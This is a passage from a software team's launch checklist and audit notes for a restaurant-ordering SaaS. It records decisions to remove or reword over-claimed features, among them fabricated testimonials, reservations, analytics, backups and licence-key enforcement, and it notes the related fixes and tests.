Flip `planAvailability.premium` to `"open"` in the commit that ships the app.

### 2 · Table reservation — **link out to the establishment's own tool**

No table, no route, no mutation. All 50 demos carried « Réserver une table »,
44 as a hero CTA; the page wrote to the visitor's `localStorage` with
always-free slots and a reference number.

Shipped: `stores.reservationUrl` (optional). Set it in Établissements →
Informations générales and the storefront renders « Réserver », pointing at
TheFork / Zenchef / Guestonline; leave it empty and no button appears at all,
which is right for the many places that book by phone. The value reaches an
`href`, so it is https-only and validated on three sides — the admin form
(`createStoreSchema`), the mutation (`assertReservationUrl`) and the storefront
(`isSafeReservationUrl`); `javascript:` and `data:` both parse as valid URLs and
both are stored XSS. 44 cases in
`packages/convex-schema/src/__tests__/reservationUrl.test.ts`.

The demos follow: `reserve.html` explains the link-out and offers the phone, and
the mocked « Réservations » module is gone from `demos/admin.html` — sidebar
entry, day panel and KPI tile. The real admin has no such module and never did.

### 3 · « ESC/POS printing » — **say what ships; cloud printing later**

`iframe.contentWindow.print()` is the whole transport.
`printerSettings` has **zero readers and zero writers**; its only non-schema
reference is a delete cascade for rows nothing creates.

The admin was already honest — `kitchen-print.ts:144` says browser is « le seul
mode disponible aujourd'hui » — and everything else contradicted it. `CLAUDE.md`,
the guided tour, `apps/docs/guides/kitchen-display.md` (which shipped a
fabricated `configurePrinter()` API), `apps/docs/api-reference/rest-api.md` (a
`POST /api/print` that does not exist) and the schema READMEs now describe the
browser path. The site's « s'imprime automatiquement » stands: it is true with
the kiosk script, and it never claimed thermal.

**The thermal path will be cloud printing** — Star CloudPRNT / Epson Server
Direct Print, where the printer polls an HTTP endpoint. Not a local agent: a
browser cannot open a raw socket and Convex cannot reach a restaurant's LAN, so
the alternative is shipping and supporting signed desktop software per OS. The
three providers already sit in `kitchen-print.ts` as `available: false`. No
public promise has been made about it, deliberately.

### 4 · Menus / formules — **build the orderable flow, in its own PR** (#352)

Not "one reader and no UI": the admin half is **complete** — a « Menus /
Formules » tab, a 473-line list and a 761-line section builder, Convex CRUD,
RBAC, cross-store guards. Nothing downstream exists: `api.menus` has zero
storefront readers and `orders.ts:518` rejects any line without a `productId`.
`menu.addComboToCart` — « Ajouter la formule au panier » — is translated into
fr/en/es in both apps and referenced nowhere.

Decision: **build it.** ~25 files, ~1 400–1 700 lines. The cost is not the UI;
it is VAT allocation across a mixed-rate formule and how category promotions
apply to dishes bought inside one. Both are money-correctness problems and want
a PR where a reviewer can see only them.

**Open until that PR lands**, and tracked as #352, which carries the file-level
breakdown, the two money-correctness questions and the loose ends found while
measuring (a public unfiltered `menus.list`, `platformVisibility` collected and
never read, a dead `prizes.menuId`). The tour still tells owners they can
« proposer des offres combinées » and no customer can order one. That gap is
deliberate and recorded rather than papered over.

### 5 · Square — **keep it visible, marked « Bientôt »**

Zero lines. The only executable code naming Square is the one that refuses it
(`refundPolicy.ts:151-158`), and `RefundRoute`'s `api` variant excludes it at the
type level. Never claimed on beyours.fr — the exposure was in-product and
agent-facing.

Shipped: Paramètres → Paiements names Square as forthcoming, in the same
convention as the print providers. The guided tour says « Square arrive ». The
MCP registry, `CLAUDE.md`, `apps/docs` and the package docs call it announced and
unimplemented. The Square option was removed from the payments-list **filter** —
a filter over past payments that can never match is not an announcement — while
the badge map stays, so a legacy row would still render.

**Not closed by this card:** `apps/docs/guides/payments.md` imports seven
functions from `@be-yours/core`, and `packages/core/src` has no `payments/`
directory — every one is module-not-found, Square's and the four real providers'
alike. A warning now sits at the top of that guide; rewriting it is #330
NEW2-SOLD-3, not this card.

## LAUNCH-05 · Settle the S3 bucket policy
Two opposite assumptions coexist (P0-34). Choose private + authenticated proxy, or
public/CloudFront with `AWS_S3_PUBLIC_BASE_URL` required. Write the decision into
`apps/docs/deployment/` — the whole P0-34 fix depends on it.

## TECH-07b · Two automation triggers the schema cannot support
**Priority:** medium · **Parent:** #109

Split out of TECH-07, which is otherwise closed. Both are blocked on data that does not
exist, not on the automation engine, which works.

- [ ] **`birthday` needs a date of birth.** No table carries one — not
  `emailSubscribers`, not `userProfiles`. Needs a schema field, a migration, somewhere to
  collect it (subscribe form, account page or order flow), a GDPR basis for a new
  category of personal data, and a daily cron matching today's date.
- [ ] **`abandoned_cart` needs a persisted cart.** The cart is
  `packages/restaurant/src/stores/cart.ts` — Zustand with `persist` to localStorage,
  never written to Convex. Needs a `carts` table, a write path, an identity for anonymous
  carts, a definition of abandonment, and a sweep.

Until then both stay `ready: false` and their admin toggles stay disabled with a stated
reason, which is the honest state rather than a switch that controls nothing.

---

## LAUNCH-06 · Move AWS SES out of the sandbox
`tasks/production-accounts-checklist.md:52`: SES starts sandboxed in eu-west-3. Until
production access is granted, **no client can email a real consumer** — order
confirmations included.

**Status, 4 Sep 2026 — the repository half is closed, this card is not.** `ses:check` is
wired in both apps and covered by `apps/*/scripts/check-ses-status.test.mjs`, and the
procedure is written step by step in `tasks/client-aws-onboarding-runbook.md`.

**The card's premise has changed, and the sentence above is no longer true as written.**
It assumes one shared account, where a single unlock covers the fleet. Since #197 every
client gets its own AWS account, and AWS grants production access **per account** — so
this is one request per client, each with its own review, filed on day one of onboarding
rather than once for everyone. `DOMAIN=<client-domain> pnpm ses:check` answers where any
one account stands without opening the console: exit `0` means that account can email
real customers, `1` names what blocks it, `2` means it could not tell — and `2` is never
to be read as ready.

For `beyours.fr` itself there is nothing left to request. The BeYours account's request
was **refused** (`apps/site/MISE_EN_PROD.md:120`) and the answer was Resend, which
`apps/site/convex/email/providers.ts` implements behind `EMAIL_PROVIDER=resend`. What
remains there is configuration, not a request.

Unlike LAUNCH-09, this card has **no wizard**: the runbook is the artefact, and
`scripts/wizards/` holds no SES onboarding script. Naming one would send an operator to a
path that does not exist.

**Open exposure, filed as #212.** A client whose request AWS refuses has nowhere to go:
`EMAIL_PROVIDER` exists only in `apps/site`, while the engine builds an `SESv2Client`
inline in every sending path. Since the refusal above already happened once, this is worth
deciding before the first client files a request rather than after one is refused.

## LAUNCH-07 · Check the Convex spending cap
A cap set too low disables **every** project on the team, production included. Account
recovery runs through an owner who is not `developers@beyours.fr`.

## LAUNCH-08 · Make CI blocking and switch E2E on
Set `CONVEX_E2E_ENABLED=true` and the `E2E_*` secrets, then make CI and E2E required
status checks on `main`. See TECH-12.

## LAUNCH-09 · Restrict the Google Maps key and provision the bootstrap token
`NEXT_PUBLIC_GOOGLE_MAPS_API_KEY` is public by design but must be restricted by HTTP
referrer per client domain, or it is a billing-drain vector. And provision
`ADMIN_BOOTSTRAP_TOKEN` per deployment, without which no first administrator can be
appointed (TECH-11).

**Status, 4 Sep 2026 — the repository half is closed, this card is not.** The
first-administrator path is built and tested (TECH-11, and #180 in the battle plan). What
remains here is exactly the two console actions, and neither can be closed from the
repository.

**Both are scripted**: `scripts/wizards/github-e2e-maps-bootstrap.sh`. It generates and
places the bootstrap token itself, prints the Google Cloud click path, and then verifies
the referrer restriction over the network rather than trusting that somebody applied it.
`--check` writes nothing and exits non-zero while anything is outstanding, so it works as
a pre-handover gate. Neither step can be closed from the repository: the Convex
deployment and the client's Google Cloud project both belong to the account owner.

## LAUNCH-10 · Register every client site's licence key
`saDeployments` must hold the `licenseKey` before handover, otherwise maintenance
renewals are unenforceable: `http.ts:716-746` answers
`entitled: true, reason: "unregistered"` for any unknown key, and the client-side script
also fails open.

**Status, 5 Sep 2026 — the repository half is closed, this card is not.** Three
things landed, none of which can close the two account-owner actions below.

- **A delivered site now gets a key.** `saFleet.create` already stamped one at
  provisioning (#70); `saFleet.updateStatus` now stamps one at go-live when the
  deployment reached handover without it, and records that it still has to be
  reported into the site's `.beindigital-site.json`. The console shows the key,
  the licence API and the exact `pnpm setup` line, and `saFleet.issueLicenseKey`
  — which had sat with no caller since #70 — is reachable at last, so a site
  delivered before the gate existed can be given one.
- **The fail-open is now one switch, not a hard-coded branch.**
  `resolveLicenseEnforcement` reads `BEYOURS_LICENSE_ENFORCEMENT` and
  `resolveUnknownKey` is the single place the gate opens or closes. The default
  is unchanged — an unknown key is still let through — because flipping it before
  every delivered site is registered would refuse exactly those sites.
- **`GET /maintenance/status` has tests.** It had none, which is where the defect
  lived: `byLicenseKey` returning `null` and the route turning that into
  `entitled: true`. Both policies are now covered, including that a refusal
  arrives as HTTP 200 — a 4xx reads as "API unreachable" to the client script and
  would fail open.

An adversarial pass against the closed gate found four ways to still get
`entitled: true`, three of which reproduced. Fixed here:

- **The key alone proved worthless.** `saFleet.create` never accepted an
  `orderId`, so no deployment had one, so entitlement always resolved through
  "every subscription under this customer's email, keep the most favourable" — a
  customer running two restaurants was entitled on both by whichever contract was
  healthiest. Measured: a console-created site with no contract of its own
  answered `entitled: true, reason: "active"` under strict. `create` and `update`
  now take an `orderId`, the provisioning form lists the customer's paid orders,
  and the fleet page lists the delivered sites still unlinked. Filed in
  `MISE_EN_PROD.md` as traceability; it was the enforcement.
- **A crash was a free pass.** Two `subscriptions` rows on one order — reachable,
  the webhook's existence guard reads and writes in separate transactions — made
  `unique()` throw, and an uncaught error in an `httpAction` is a non-2xx, which
  the client script reads as "API unreachable" and updates anyway. The
  entitlement read no longer uses `unique()` anywhere.
- **A failed renewal could stay in grace for ever.** `past_due` with no
  `currentPeriodEnd` recomputed its 14-day window from `now` on every request.
  The window is now anchored to the period the subscription was created for.

Not fixed, and deliberate: a deployment whose email matches no subscription is
still let through. Linking its order removes the dependency on that email match.

Outstanding, both the account owner's: **(1)** issue a key AND link the order for
every site already delivered — the fleet page lists both gaps, the repository
cannot; **(2)** decide whether to set `BEYOURS_LICENSE_ENFORCEMENT=strict`, which
makes renewals enforceable and would freeze the updates of any site still missing
a key. Order matters: (1) then (2). Runbook:
`tasks/license-key-registration-runbook.md`.

Both of the residues this audit could not close were closed on `main` by #343
while this branch was open: `subscriptions.create` now refuses a second row per
order, and the email fallback reads 200 rows newest-first instead of 20
oldest-first — the second was a *fail-closed* bug, refusing a paying client whose
live contract had fallen outside the window. This branch keeps the tolerant read
alongside that guard: prevention stops new duplicates, tolerance answers for the
orders that predate it.

The client-side check keeps failing open, and cannot do otherwise: the sentinel
lives in the client's own repository, and `BEYOURS_LICENSE_API` overrides the
host it asks. The gate is a courtesy; the lock is repo and registry access.

---

## LAUNCH-11 · Settle the eleven sold-but-absent capabilities — **decided 5 Sep 2026**

Eleven capabilities, measured at `009af63` by the discovery audit and re-measured
at `158019f` before any decision was taken. Two of the eleven had moved: **T-4 was
already fixed** by #340, and **four sub-claims of T-8 and T-10 were wrong** — the
controls they said did not exist do exist, and report success while changing
nothing, which is a worse failure than absence. Two findings the audit never
carded turned out to outrank most of the list.

This is LAUNCH-04 at four times the scale, and it follows LAUNCH-04's rule: build
it or remove it from the copy; shipping neither is not an option. The owner
decided each item.

**One constraint shaped every answer.** The guard #350 added — *no plan on sale
advertises a feature that is only planned* (`planAvailability.test.ts:150`) —
means `"planned"` is unavailable for anything sold on Essentielle, because
Essentielle is open. Marking an Essentielle row `"planned"` fails the build unless
the plan closes, which stops all revenue. So for Essentielle claims the honest
moves are: reword to what ships, remove the row, or build it. Every decision below
is one of those three.

### 0 · Uncarded, and the most urgent thing in the batch — **remove**

Every delivered client homepage published three invented five-star testimonials
signed "Emma L.", "Marc D." and "Sophie R.", each with a generated face from
`i.pravatar.cc`; a hard-coded `4.5★` on every real dish from the restaurant's own
catalogue; two invented dishes at 4.7 and 4.8 next to the real ones; and "4.9/5
Average Rating" / "10K+ Happy Customers" tiles. The About page defaulted to "10K+
clients satisfaits" and a "4.9/5 note moyenne".

None of it was reachable from the admin — the homepage CMS block exposed a badge
and a section title, and the schema shape that models editable testimonials
(`cmsHome.testimonials.items[]`) is dead. Removing invented reviews from a
restaurant's own site required an engine code change. The product has no `reviews`
table and no `ratings` table, so every star it drew was a literal somebody typed.

Shipped: both sections deleted in both apps, their CMS block definitions removed,
`MealCard.rating` made optional so the star renders only when a rating is
supplied, and the About stats reduced to what the owner actually entered — an
empty section now disappears rather than publishing a figure nobody measured.
`tests/storefront/no-fabricated-social-proof.test.ts` holds it in both apps, and
it bites: 7 of 7 cases fail against the pre-fix tree.

The 50 sales demos carried two smaller versions of the same thing, now closed:
`demos/admin.html` showed a « Statistiques » nav item wired to nothing, four
order modes where the product has three (« Click & collect » is not a fourth —
it is what « À emporter » is called on the pricing page), and a disclaimer
promising « les statistiques sont réelles »; and `demos/index.html` claimed a
design « se rebadge à votre nom et votre couleur **en un clic** », which is a
thing BeInDigital does at build time, not a control an owner has.

**Two guided-tour steps went with it.** « Clients » and « Composants » each
narrated a full feature and then navigated the owner to a `<ComingSoon/>` —
those two routes are the only ones in the admin that still render one, and the
tour opens 1.2 s after a first login, unprompted. `nav-customers` could never
have highlighted anything either, since the sidebar derives its anchors from
nav entries and Clients is deliberately kept out of the nav.

#362 removed both steps on `main` while this branch was open, having found them
the same way, and rebuilt the tour around them: `TOUR_STEP_SPECS` replaces
`TOUR_STEPS`, and `packages/admin/src/__tests__/onboarding-tour.test.ts` covers
every check this branch had written its own `tour-destinations.test.ts` for, in
a stronger form — it resolves a step's route against both apps, follows the
one-line re-export into the package rather than only the `/x → /dashboard/x`
redirect, and refuses a destination that renders the placeholder. That file is
therefore deleted here rather than repaired: two suites asking the same
question, one of them weaker, is worse than one.

What this branch still owes the merged tour is copy. Its « Design » step sold
four tabs including « Thème », and told the owner that colours, typography and
the logo are set there and apply to the selected establishment — every clause of
which this card makes false. Both that step and the « Paramètres » step now say
what the screen does: three tabs, colours and typography not yet reaching the
public site with saving disabled for that reason, and the logo on the CMS
« Layout du storefront » page. Put the Clients step back in the commit that
ships the page.

### 1 · Analytics, and the plan gating that does not exist (T-1) — **reword now, build the metrics in their own PR**

`pricing-data.ts` sold « Analytics & suivi des performances » as `essentielle:
false, premium: true` — Premium's only Gestion-tier differentiator, and the one
line separating the two plans in that category. `/fonctionnalites` named five
metrics: chiffre d'affaires, panier moyen, plats populaires, heures de pointe,
taux de retour. **Three of the five exist nowhere**, `find … -iname '*analytic*'`
over the engine and the client app returns 0, and the sharper finding is the
second one: `grep -riE '"essentielle"|"premium"|planSlug'` over `apps/themes/convex`
and `packages/*/src` returns nothing but email-subscriber tags in test fixtures.
**There is no plan gating anywhere.** The engine never learns which plan was
bought, so nothing is withheld from Essentielle either, and the Premium upsell
buys nothing.

What ships is one dashboard on one query — `api.orders.list`, every order for the
store pulled into the browser and aggregated client-side — with every time window
a literal (today, 24h, hier, 7 jours, 30 jours), no period picker, and a nav entry
carrying no `requiredPermission`, so everyone sees it.

Decision: **reword now**, and the row moves to `essentielle: true, premium: true`,
because that is the truth — the dashboard is available to everyone. Premium then
differentiates on the native application alone, which is what #350 already decided
it is worth. The three missing metrics are decided **build**, deferred to their own
PR: a server-side aggregate is worth writing on its own merits, since the dashboard
currently downloads a restaurant's entire order history to draw four cards — the
same defect NEW-P files against `orders.list`.

Plan gating is **not** being built. It is unnecessary while Premium is closed for
sale, and when it is wanted, `maintenanceContracts` is already the right home: one
singleton row per deployment, written by the team, read-only for the client.

### 2 · Customer management (T-2) — **build it**

No `customers` table among the 75 registered. The page is `<ComingSoon title="Clients" />`,
byte-identical in both apps, and `nav-config.ts:115-116` keeps it out of the nav
on purpose. The onboarding tour, auto-launched 1.2 s after first login, walks
every new owner to it anyway: « Clients — Votre carnet d'adresses intelligent !
Retrouvez chaque client, son historique de commandes, ses coordonnées et ses
préférences. » Then `goTo("/customers")`.

**Correct the audit's citations before reusing them.** The count is 75 tables, not
72; the nav comment is at lines 115-116, not 103-104; and `features-data.ts:203` /
`pricing-data.ts:101` are *loyalty* copy, not CRM — a full sweep found no CRM claim
in either the feature or the pricing data at all. The sales-side promises are four
locations on `/decouvrir` and the landing page.

Decision: **build it**, in its own PR, because it is far cheaper than "no
implementation anywhere" suggests and three surfaces already promise it. Every
order carries name, email and phone, indexed `by_customerId`.
`emailSubscribers.metadata` already computes `totalOrders`, `totalSpent`,
`lastOrderAt`, `averageOrderValue` and `favoriteProducts`, maintained incrementally
on every order status change and already rendered per person with an event
timeline. Rule-based segmentation ships with a UI. The storefront half — account,
orders, addresses, favourites — is built.

What that PR has to settle, and why it is not a copy change: the deliberate
non-link at `orders.ts:1114-1121` (*"an order is a purchase, not consent to be
marketed to"*) is a consent decision, not code; the gamification → subscriber link
does not exist, so a won game's email lands in `gamePlays` and cannot be
campaigned to; and there is no CSV export anywhere in the admin, while
`competitor-comparison.tsx:43` sells « Vous possédez vos clients (emails, data) ».

### 3 · Themes by restaurant type (T-3) — **remove the picker; the branding chain is a follow-up**

The `themeId` census was right — five declarations, zero writers, zero readers —
but "no runtime selector" was wrong, and the truth was worse. `Contenu → Design →
Thème` shipped a live, nav-linked card grid offering the six sold themes, of which
**`fine-dining` and `cafe` have no template anywhere in the repository**. Its
button, « Appliquer le thème sélectionné », was wired to the colour-save handler:
it wrote three hex strings and let `theme.id` die in local React state.

And the three hex strings reached nothing. `updateBranding` is real, permissioned,
audited and merges correctly — the break is one link later. Every storefront
branding read goes through the CMS block (`logo`, `brandName`, `favicon`); there
are zero reads of the Convex `store.branding` document in
`apps/themes/{app,components,lib}`, and the palette and fonts are compile-time
constants. An owner picked a colour, got « Couleurs mises à jour avec succès », and
their site was unchanged.

What beyours.fr sells is different and honest: **50 templates across five
verticals**, all 50 applicable, enforced by a test, chosen by an operator at clone
time. The six-theme picker was the only place the product claimed otherwise.

Decision: **remove the picker**; leave the Couleurs and Typographie controls in
place but disabled with a stated reason, on the TECH-07b pattern — the write path
is correct and complete, and deleting the mutation would be the wrong fix. Wiring
`store.branding` into the storefront is a follow-up, and it has to reconcile the
two rival branding stores before either can render.

### 4 · The sitemap and the structured data (T-4) — **already fixed, nothing to decide**

#340 rewrote every file the claim named, in both apps, byte-identically. The
sitemap emits eight URLs and every one is a route the app serves; emitted URLs
that 404: **zero**; real public routes missing from it: **zero**.
`buildRestaurantSchema`, `buildMenuSchema` and `<JsonLd>` are called from
`lib/structured-data.ts` and rendered in four route files per app, held by a test
that reads those route files off disk. `robots.ts` shares the disallow list, so
the two cannot drift.

Residue closed here: `lib/store-url.ts` in both apps still built `/s/{slug}` from
the removed scheme and had zero importers. Deleted. Found in passing and also
closed: the `(admin)` route group's pages resolve at bare top-level paths
(`/products`, `/orders`, `/customers`…) which were absent from
`CRAWLER_DISALLOWED_PATHS`, and the layout gates client-side, so a crawler was
served a 200 shell.

### 5 · Push notifications (T-5) — **reword; staff push is not built**

Zero lines of push code anywhere: no service worker, no manifest, no VAPID, no
library in any of the fifteen workspace manifests. What ships is three Web Audio
beeps on the kitchen display, behind a click-to-unlock overlay, which work only
while the tab is open.

Eight of the nine mentions are correctly tied to the Premium mobile app and gated
by `planAvailability`. One was not: a benefit bullet inside *Centralisation des
Commandes*, `pillar: "gerer"`, no « À venir » badge — sold on Essentielle today.
Its own long description two lines above was already honest.

Decision: **reword the one line.** Staff-facing web push is buildable without an
app store and would solve the closed-laptop case the beeps cannot, but nobody has
asked for it; customer-facing push stays deferred behind the Premium gate and
ships with the application. Worth recording for whenever it is picked up: iOS
Safari delivers Web Push only to a home-screen-installed PWA, so it solves the
kitchen tablet and the desktop, and only partly the owner's phone.

### 6 · Click & collect « avec créneaux horaires » (T-6) — **reword**

Two dead fields, not one. `orders.scheduledAt` had zero writers and zero readers.
`orders.scheduledFor` has exactly one writer — the Uber Eats importer, constrained
to platform orders — and exactly one reader, which was backwards: it bumped the
ticket to `urgent`, making an order for 20 h 00 the most urgent thing in the queue
at 11 h 00. `orders.create` accepts no time field of any kind, and the checkout
collects a name, an email and a phone.

There is no slot picker anywhere in the product — except on the sales site, where
the interactive demo a prospect clicks through had a working one: « Créneau · Dès
que possible (~30 min) · Dans 1 heure · Ce soir · 20h00 ».

Note the scoping, because it matters: the bare phrase « click & collect » is
**true** — `type: "pickup"` works end to end — so the ~50 generic mentions stand.
Only the slot claim was false.

Decision: **reword**, and clean up what the decision implies — the demo dropdown
is gone, `scheduledAt` is deleted, the inverted priority rule is corrected, and the
**Click & Collect switch** in two admin screens (which persisted to
`globalSettings.services.clickAndCollect` and which `ORDER_TYPE_SERVICE` never
read) is disabled with a stated reason rather than left as a control that does
nothing.

Building slots means modelling capacity — a future-hours enumerator, slot
inventory with a transactional check inside `orders.create`, lead time, a KDS that
surfaces a scheduled ticket at `scheduledFor − prepTime`, and an interaction with
the 24 h Stripe reconciliation sweep. That is the same cost LAUNCH-04 declined for
reservations, and deciding it differently here without proven demand would be
inconsistent.

### 7 · Daily backups and 24/7 monitoring (T-7) — **alert and reword now; build the nightly backup**

Half of this claim was stale and half was worse than stated.

**Monitoring:** #346 shipped a genuine 10-minute uptime prober with a 30-day
window, and it is careful work — it refuses to invent a `/health` route because
probing one would report every client down. But it is BeInDigital's internal
console, behind `requireAdmin`, with no client-facing status page, and **nothing
alerts**. A restaurant that goes down at 20 h 00 on a Saturday changes one row in
an activity feed and pages nobody.

**Backups:** not 29 of 100 tables — **22 of 75**. Omitted: `orders`, `payments`,
`kitchenTickets`, `teamMembers`, `gamePlays`, `prizeRedemptions`, and all sixteen
`cms*` singleton tables, so a "backup" of a restaurant's website does not contain
that website's pages. And it is not scheduled: the only caller is a button that
builds a JSON blob and triggers a browser download to whatever laptop the admin
was sitting at. If nobody clicks, nothing exists. The product is honest about this
to the operator's face on import; the pricing page was not.

Worth separating, because the two exposures are not the same size: the CGV defines
Maintenance as covering « l'hébergement, les mises à jour, **la supervision** et le
support » — a word the new prober arguably satisfies — and **never mentions
sauvegardes at all**. The daily-backup promise lived only on the pricing page and
in the FAQ answer titled « Que comprend exactement la maintenance ? », which is
the specific version a buyer reads before paying.

Decision: **reword the Sauvegardes tile and the FAQ now** to the export that
exists, and **build** the alerting and the nightly backup. Both builds are deferred
to their own PR — the alerting because its destination is an operational choice,
the backup because expanding table coverage means deciding what restoring trading
history *means*: re-inserting orders under new ids while Stripe holds the old
`paymentIntentId` is a reconciliation problem, not a restore, and it forces
per-table streaming (the export currently builds one JSON blob in memory, capped
at 50 MB on import). The copy describes what the export carries until that lands.

Correction to the record: **#169 is closed, not reopened** — the id-remap fix
landed with a 319-line test. What it does not do is carry orders.

#### Both builds shipped — 7 Sep 2026 (#331)

The copy was rewritten a second time in the same commit, which is what that
"until that lands" was owed.

- **Alerting.** The transition branch at `saMonitoring.ts` schedules
  `email/send.sendDeploymentHealthAlert` to `BID_NOTIFY_EMAIL`, in both
  directions — a recovery is as much news as a failure. Not sent to the
  restaurateur: the prober lives in the site's Convex and the client's System
  screen in theirs, so a client-facing channel has to be designed rather than
  bolted onto a `deliver()` call. **A destination is still not a rota.** An
  address makes the alert exist; only a named person on call makes « 24/7 »
  literally true, and that remains owed.
- **Coverage.** 53 restorable tables, 3 archived-not-restored, 21 excluded with
  a reason each, in one list
  (`packages/convex-functions/src/backupTables.ts`) that both the export and the
  import read. The count in this section — 22 of 75 — was measured against a
  schema that has 77 tables.
- **Orders.** Restored, and the reconciliation worry above turned out to be
  narrower than it reads: `orders` and `payments` carry their provider ids as
  ordinary fields, so a re-inserted row still names the same payment intent. The
  streaming concern is real and unaddressed — the export still builds one blob
  in memory — and is what will cap this at a deployment large enough to hit it.
- **Invoices** are exported and never re-imported. `tables/invoices.ts` had
  already stated the rule in the schema (art. 242 nonies A CGI); the export now
  honours both halves of it instead of dropping the archive to avoid the
  question.
- **Off-site.** The client's own bucket under `backups/`, 30 days by lifecycle
  rule. The ownership question this section did not raise is now written down
  where it is load-bearing: a backup in the client's account **shares a blast
  radius with the data it protects**. It defends against a bad import, a deleted
  establishment or a Convex incident, not against losing the AWS account. A
  BeInDigital-owned bucket is the fix and reverses `aws-ownership.md`. **Still
  owed, still commercial.**
- **Rehearsal.** `apps/docs/deployment/backup-restore-rehearsal.md`, quarterly.
  Not yet run against a live client's file.

### 8 · The fifteen smaller features (T-8) — **reword, and four cheap corrections**

Most of the fifteen were promised only in `_project/FEATURES_DIAGRAM.md`, whose
own phasing is honest and whose total table flattened it. **Four of the audit's
claims were wrong**, and in each case what replaced "it does not exist" is a
control that reports success and changes nothing — the same defect class the
branding merge fix was written to eliminate (`stores.ts:497`: *"the clear button
would be another control that reports success and does nothing"*).

- **Couleurs, Typographie, Logo** — the pickers ship and save correctly; nothing
  renders them. Handled with T-3.
- **RTL** — the « Droite à gauche » switch persists a boolean whose only reader
  prints the letters "RTL" in an admin cell. 145 physical direction utilities,
  zero logical ones, no `dir` on `<html>`, and the `getLocaleDirection` helper
  that would do it has no callers. Arabic renders left-to-right.
- **Devise** — the picker saves; all 26 storefront `formatPrice` call sites pass
  the amount alone, so every price is `fr-FR`/EUR whatever the owner chose. The
  admin *is* currency-aware, which is why this went unnoticed.
- **Priority** — three writers hardcode `"normal"` and every ticket shows a
  permanent grey "Normal" badge carrying zero bits, while a complete, tested
  classifier (`getPriorityLevel`) sits orphaned in `packages/restaurant`.

Genuinely absent, and reworded rather than built: **Nutritional Information** (a
dead column, three translated UI strings, no form field, no display),
**Image Gallery** (41 reads, all `images[0]`; the only writer writes exactly one
URL, and the tour narrates an "images" field the product form does not have), and
**Bulk Translation** (`translateUIStrings` orphaned under a comment claiming the
admin calls it — though the catalogue backfill and the CMS « Traduire tout » both
genuinely work, so the tour's « traduit toute votre carte » is true).

Two the audit got wrong in the other direction, and worth recording so nobody
re-files them: **`translationJobs` has had writers since #317** — its real defect
is zero *readers*, so a quota-failed batch is indistinguishable from a finished
one; and the **storefront language switcher works**, is mounted in the route-group
layout and reaches every visitor. The dead pair the audit found
(`LanguageSwitcher` → `AdminLanguageSwitcher`) is a different, unmounted component.

**Loyalty is the one with commercial weight.** Gamification supports a wheel and a
scratch card, and nothing carries over between plays. The site sold « Points,
niveaux, défis, récompenses exclusives », a « Système de points, niveaux et
récompenses personnalisable » and « Suivi et analyse du comportement de
fidélisation » — and rendered a finished mockup of a tier system: a « Niveau Gold »
badge, a progress bar from 320 pts toward « Platinum · 400 pts », and a « Défi du
jour · Un dessert · +50 pts » card. A prospect was shown a picture of a product
that exists in no form. The tour and both internal guides were already honest
about the wheel and the scratch card; the over-claim was entirely on the
commercial site.

Decision: **reword the loyalty copy** to the mechanic that ships, redraw the
mockup, and disable the RTL and Devise controls with a stated reason. Building
points, tiers and challenges is weeks of work on a retention programme nobody has
scoped.

### 9 · Reviews, SMS, suppliers, purchase orders (T-9) — **the marketing was already clean**

No schema for any of them, confirmed. But `apps/site` sells none of the six: the
only « avis » on the site is the Google Business Profile *training* deliverable,
which is correct as written. `apps/docs`, the MCP registry, the tour and the admin
nav are all accurate, and reservations are fully consistent since #350. The
promise concentration was internal.

Two things were live defects rather than copy, and both are closed here: the
fabricated reviews of section 0, and a « **Notifications SMS** — Alertes en temps
réel pour la livraison » switch in every client's storefront account page, which
persisted a preference that no code in the repository can honour — there is no
Twilio, no Vonage, no sender of any kind.

Logged separately rather than fixed here, because it is an inventory defect and
not a copy one: **nothing decrements stock on an order**. Stock tracking, low-stock
alerts and auto-disable are real and reach Uber Eats and Deliveroo, but every
quantity is typed by hand.

### 10 · Two-factor auth and social login (T-10) — **not sold; the docs were the problem**

The technical core held and was understated: `plugins: []` with `twoFactorPlugin`
commented above it, and the whole `createAuthConfig` function has **zero call
sites**, so `socialProviders` is a passthrough on a config object that is never
constructed. But the commercial premise did not hold — a full sweep of `apps/site`
found no 2FA or social-login claim anywhere. Security is sold as « Hébergement
sécurisé », « Hébergement & SSL » and « mises à jour de sécurité », all true.

The promises lived in `_project/` and in `apps/docs/guides/authentication.md`,
which is written in the present tense and whose setup path names an export, three
options and two import paths that do not exist — a developer following it fails at
the first import. That guide is rewritten against the code, and `authRoutes` is
deleted: it was dead, exported from the published package barrel, and **7 of its 8
paths were wrong**, so anyone who discovered it and wired it up would have shipped
a sign-in link to a 404.

`twoFactorEnabled` is now optional and commented. A required, non-optional column
named exactly like a protection — written `false` by `claimFirstAdmin` for every
deployment's `super_admin`, under a comment asserting it builds every field the
schema requires — reads as a capability to anyone auditing the schema. Better
Auth's `twoFactor` storage is already provisioned on every deployment, so enabling
it later is a plugin registration plus the enrolment and recovery UI; the UI is
the cost.

### 11 · The "181+ features" headline — **replaced with the measured figure**

`_project/FEATURES_DIAGRAM.md:647` was its only origin, and the 22-row table above
it sums to **201**. `CLAUDE.md:130` copied the headline over an enumeration of 92.
Several categories count non-features — six themes as six, seven team roles as
seven, six social-action types as six. None of the three numbers counts anything
that was measured.

The public site was never affected: it sells « 10 fonctionnalités » over a
four-pillar taxonomy with no relationship to the diagram.

Shipped: the diagram states its own arithmetic and carries a banner saying it
counts designed features, not shipped ones; `CLAUDE.md` carries the audited figure
— **29 shipping · 23 partial · 41 absent**, of the 92 it enumerates; and
`_project/PRESENTATION.md` carries a banner naming the four sections that were
written before the code and never revised against it, including a maintenance
table with SLAs that are not the offer.

### Deferred to their own PRs, and why

Three builds the owner approved, each held back so a reviewer can see only it:

- **The Clients page** (section 2). Read-only aggregation over data already
  written, plus the nav entry, the tour anchor and the CSV export. Its real
  content is the consent decision at `orders.ts:1114-1121`.
- **The three analytics metrics and a period selector** (section 1). Carries the
  server-side aggregate that also closes NEW-P.
- **The nightly backup and the monitoring alert** (section 7). The alert is hours;
  the backup's cost is deciding what restoring `orders` means.

### Not yours to close

Nothing in this card ends in a third-party console. The alerting build will: a
destination address, and a rota, are what make « 24/7 » literally true, and no
amount of code supplies either.

### Found while working this card, and NOT fixed here

**`apps/site` was red on `main` since #350, and the red was hiding a suite that
no longer tested anything. Diagnosed here; the fix that ships is #355's.**

`tests/convex/checkoutReferralIntegrity.test.ts` reported **25 failed | 6
passed**. Every case called `createCheckoutSession` with `plan: "premium"`, and
#350 deliberately put the plan-availability refusal ahead of every other check,
so all 25 died on « L'offre Premium n'est pas encore ouverte à la vente »
without ever reaching a referral guard. Those guards had been unexercised
